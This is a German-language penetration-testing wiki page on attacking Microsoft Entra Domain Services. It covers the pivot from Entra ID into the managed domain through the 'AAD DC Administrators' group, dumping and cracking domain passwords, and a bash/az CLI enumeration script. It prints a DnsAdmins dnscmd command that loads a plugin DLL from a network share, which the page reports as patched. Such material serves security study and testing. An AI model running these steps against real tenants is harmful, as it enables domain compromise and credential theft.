# Az - Microsoft Entra Domain Services

{{#include ../../../banners/hacktricks-training.md}}

## Domain Services

Microsoft Entra Domain Services ermöglicht die Bereitstellung eines Active Directory in Azure, ohne Domain Controllers verwalten zu müssen (tatsächlich hat man nicht einmal Zugriff auf diese).

Das Hauptziel ist es, Legacy‑Anwendungen in der Cloud auszuführen, die keine modernen Authentifizierungsmethoden nutzen können, oder dort, wo Verzeichnisabfragen nicht ständig an ein On‑Premises AD DS zurückgehen sollen.

Beachte, dass, um die in Entra ID erzeugten Benutzer (und nicht aus anderen Active Directories synchronisierten) mit dem AD domain service zu synchronisieren, du das Passwort des Benutzers **ändern musst**, damit es mit dem neuen AD synchronisiert werden kann. Tatsächlich wird der Benutzer nicht von Microsoft Entra ID zu Domain Services synchronisiert, bis das Passwort geändert wurde.

> [!WARNING]
> Selbst wenn du eine neue Active Directory‑Domain erstellst, kannst du sie nicht vollständig verwalten (es sei denn, du nutzt bestimmte Fehlkonfigurationen), was bedeutet, dass du standardmäßig beispielsweise keine Benutzer direkt im AD erstellen kannst. Du erstellst sie durch **synchronizing users from Entra ID.** Du kannst angeben, alle Benutzer zu synchronisieren (auch diejenigen, die von anderen on‑premise ADs synchronisiert wurden), nur Cloud‑Benutzer (in Entra ID erstellte Benutzer), oder sie sogar **weiter einschränken**.

> [!NOTE]
> Allgemein gilt: Aufgrund der eingeschränkten Konfigurationsmöglichkeiten der neuen Domain und der Tatsache, dass ADs üblicherweise bereits on‑premise vorhanden sind, ist dies nicht die primäre Integration zwischen Entra ID und AD, aber es ist trotzdem interessant zu wissen, wie man sie kompromittieren kann.

### Pivoting

Mitglieder der erzeugten **`AAD DC Administrators`** Gruppe erhalten lokale Admin‑Rechte auf VMs, die an die verwaltete Domain angebunden sind (aber nicht auf die domain controllers), weil sie in die lokale Administrators‑Gruppe aufgenommen werden. Mitglieder dieser Gruppe können außerdem **Remote Desktop to connect remotely to domain-joined VMs**, und sind außerdem Mitglieder der Gruppen:

- **`Denied RODC Password Replication Group`**: Dies ist eine Gruppe, die Benutzer und Gruppen angibt, deren Passwörter nicht auf RODCs (Read-Only Domain Controllers) zwischengespeichert werden können.
- **`Group Policy Creators Owners`**: Diese Gruppe erlaubt Mitgliedern, Group Policies in der Domain zu erstellen. Allerdings können ihre Mitglieder Group Policies nicht auf Benutzer oder Gruppen anwenden oder bestehende GPOs bearbeiten, daher ist sie in dieser Umgebung nicht so relevant.
- **`DnsAdmins`**: Diese Gruppe erlaubt die Verwaltung der DNS‑Einstellungen und wurde in der Vergangenheit missbraucht, um [escalate privileges and compromise the domain](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=dnsadmin#dnsadmins), jedoch wurde nach Tests des Angriffs in dieser Umgebung festgestellt, dass die Schwachstelle gepatcht ist:
```text
dnscmd TDW52Y80ZE26M1K.azure.hacktricks-training.com /config /serverlevelplugindll \\10.1.0.6\c$\Windows\Temp\adduser.dll

DNS Server failed to reset registry property.
Status = 5 (0x00000005)
Command failed:  ERROR_ACCESS_DENIED     5    0x5
```
Beachte, dass zur Gewährung dieser Berechtigungen innerhalb des AD die Gruppe **`AAD DC Administrators`** in die vorherigen Gruppen aufgenommen wird und außerdem die GPO **`AADDC Computers GPO`** alle Mitglieder der Domänengruppe **`AAD DC Administrators`** als Local Administrators hinzufügt.

Pivoting von Entra ID zu einem mit Domain Services erstellten AD ist unkompliziert: Füge einen Benutzer zur Gruppe **`AAD DC Administrators`** hinzu, greife per RDP auf beliebige Maschinen in der Domain zu, und du kannst Daten stehlen und außerdem **compromise the domain.**

Das Pivoting von der Domain zu Entra ID ist dagegen nicht so einfach, da nichts aus der Domain in Entra ID synchronisiert wird. Prüfe jedoch immer die metadata aller beigetretenen VMs, da deren zugewiesene managed identities interessante Berechtigungen haben könnten. Außerdem **dump all the users passwords from the domain** und versuche, diese zu cracken, um dich dann bei Entra ID / Azure anzumelden.

> [!NOTE]
> Beachte, dass in der Vergangenheit weitere Schwachstellen in diesem managed AD gefunden wurden, die es ermöglichten, die DCs zu compromise, [wie diese](https://www.secureworks.com/research/azure-active-directory-domain-services-escalation-of-privilege?utm_source=chatgpt.com). Ein Angreifer, der die DCs compromise, könnte sehr einfach persistence aufrechterhalten, ohne dass die Azure admins dies bemerken oder es entfernen können.

### Enumeration
```bash
# Get configured domain services domains (you can add more subs to check in more subscriptions)
az rest --method post \
--url "https://management.azure.com/providers/Microsoft.ResourceGraph/resources?api-version=2021-03-01" \
--body '{
"subscriptions": [
"0ce1297c-9153-425d-3229-f51093614377"
],
"query": "resources | where type == \"microsoft.aad/domainservices\"",
"options": {
"$top": 16,
"$skip": 0,
"$skipToken": ""
}
}'

# Get domain configuration
az rest --url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/entra-domain-services/providers/Microsoft.AAD/DomainServices/<domain-name>?api-version=2022-12-01&healthdata=true"
## e.g.
az rest --url "https://management.azure.com/subscriptions/0ce1297c-9153-425d-3229-f51093614377/resourceGroups/entra-domain-services/providers/Microsoft.AAD/DomainServices/azure.hacktricks-training.com?api-version=2022-12-01&healthdata=true"

# Based on the VNet assigned to the domain services, you can enumerate the VMs in the domain

subscription_id="0ce1297c-9153-425d-3229-f51093614377"
vnet_name="aadds-vnet"

# Retrieve all VMs in the subscription
vm_list=$(az vm list --subscription "$subscription_id" --query "[].{Name:name, ResourceGroup:resourceGroup}" --output tsv)

# Iterate through each VM to check their VNet connection
echo "VMs connected to VNet '$vnet_name':"
while IFS=$'\t' read -r vm_name resource_group; do
nic_ids=$(az vm show --subscription "$subscription_id" --name "$vm_name" --resource-group "$resource_group" --query "networkProfile.networkInterfaces[].id" --output tsv)

for nic_id in $nic_ids; do
subnet_id=$(az network nic show --ids "$nic_id" --query "ipConfigurations[0].subnet.id" --output tsv)

if [[ $subnet_id == *"virtualNetworks/$vnet_name"* ]]; then
echo "VM Name: $vm_name, Resource Group: $resource_group"
fi
done
done <<< "$vm_list"
```
{{#include ../../../banners/hacktricks-training.md}}
